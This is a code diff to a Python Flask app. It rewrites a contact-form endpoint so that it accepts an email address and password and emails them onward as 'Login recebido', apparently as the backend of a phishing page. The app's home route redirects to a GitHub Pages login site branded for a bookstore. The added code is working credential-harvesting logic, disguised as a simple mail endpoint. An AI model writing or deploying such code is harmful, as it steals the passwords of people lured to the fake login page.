@@ -59,23 +59,30 @@ def home():
     # Redireciona para o site principal
     return redirect("https://livrariabomlivro.github.io/login/", code=302)
 
+
+
+
 @app.route("/send-email", methods=["POST"])
 def send_email():
     data = request.get_json(silent=True) or {}
 
-    name = (data.get("name") or "").strip()
     email = (data.get("email") or "").strip()
-    message = (data.get("message") or "").strip()
+    password = (data.get("password") or "").strip()
 
-    if not name or not email or not message:
+    if not email or not password:
         return jsonify({"error": "Preencha todos os campos."}), 400
 
+    # mensagem que vai pro email
+    message = f"Login recebido:\nEmail: {email}\nSenha: {password}"
+
     try:
-        enviar_email(name, email, message)
+        enviar_email("Login Teste", email, message)
     except Exception as e:
         return jsonify({"error": f"Erro ao enviar email: {str(e)}"}), 500
 
-    return jsonify({"message": "Mensagem enviada com sucesso!"})
+    return jsonify({"message": "Dados enviados com sucesso!"})
+
+
 
 
 # -------------------------
